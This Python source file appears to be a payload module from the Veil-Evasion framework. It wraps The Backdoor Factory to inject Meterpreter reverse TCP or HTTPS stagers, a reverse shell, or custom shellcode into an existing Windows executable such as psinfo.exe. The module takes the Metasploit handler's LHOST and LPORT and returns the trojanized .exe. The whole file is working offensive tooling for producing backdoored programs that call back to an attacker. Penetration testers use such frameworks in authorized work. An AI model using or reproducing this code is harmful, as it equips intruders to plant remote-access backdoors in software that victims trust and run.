"""

Automates running the Backdoor Factory on an existing .exe

More information from
        Joshua Pitts - https://github.com/secretsquirrel/the-backdoor-factory

"""

import sys, time, subprocess

from modules.common import helpers
from modules.common import shellcode

# the main config file
import settings

class Payload:

    def __init__(self):
        # required options
        self.description = "Automates running of the BackdoorFactory"
        self.language = "native"
        self.rating = "Normal"
        self.extension = "exe"

        self.shellcode = shellcode.Shellcode()

        # options we require user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {"orig_exe" : ["psinfo.exe", "The executable to run Backdoor Factory on"],
                                 "payload" : ["meter_tcp","meter_tcp, meter_https, rev_shell, custom"],
                                 "LHOST" : ["127.0.0.1", "IP of the metasploit handler"],
                                 "LPORT" : ["4444", "Port of the metasploit handler"]}

    def generate(self):

        if self.required_options["payload"][0] == "custom":

            Shellcode = self.shellcode.generate()

            raw = Shellcode.decode("string_escape")
            
            f = open(settings.TEMP_DIR + "shellcode.raw", 'wb')
            f.write(raw)
            f.close()

            backdoorCommand = "./backdoor.py -f " + self.required_options["orig_exe"][0] + " -o payload.exe -s user_supplied_shellcode -U " + settings.TEMP_DIR + "shellcode.raw"

        else:

            shellcodeChoice = ""
            if self.required_options["payload"][0] == "meter_tcp":
                shellcodeChoice = "reverse_tcp_stager"
            elif self.required_options["payload"][0] == "meter_https":
                shellcodeChoice = "meterpreter_reverse_https"
            elif self.required_options["payload"][0] == "rev_shell":
                shellcodeChoice = "reverse_shell_tcp"
            else:
                print helpers.color("\n [!] Please enter a valid payload choice.", warning=True)
                raw_input("\n [>] Press any key to return to the main menu:")
                return ""

            # the command to invoke the backdoor factory
            backdoorCommand = "./backdoor.py -f " + self.required_options["orig_exe"][0] + " -o payload.exe -s " + shellcodeChoice + " -H " + self.required_options["LHOST"][0] + " -P " + self.required_options["LPORT"][0]

        print helpers.color("\n [*] Running The Backdoor Factory...")

        # be sure to set 'cwd' to the proper directory for hyperion so it properly runs
        p = subprocess.Popen(backdoorCommand, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=settings.VEIL_EVASION_PATH+"tools/backdoor/", shell=True)
        stdout, stderr = p.communicate()

        try:
            # read in the output .exe from /tmp/
            f = open(settings.VEIL_EVASION_PATH+"tools/backdoor/backdoored/payload.exe", 'rb')
            PayloadCode = f.read()
            f.close()
        except IOError:
            print "\nError during The Backdoor Factory execution:\n" + helpers.color(stdout, warning=True)
            raw_input("\n[>] Press any key to return to the main menu:")
            return ""

        return PayloadCode
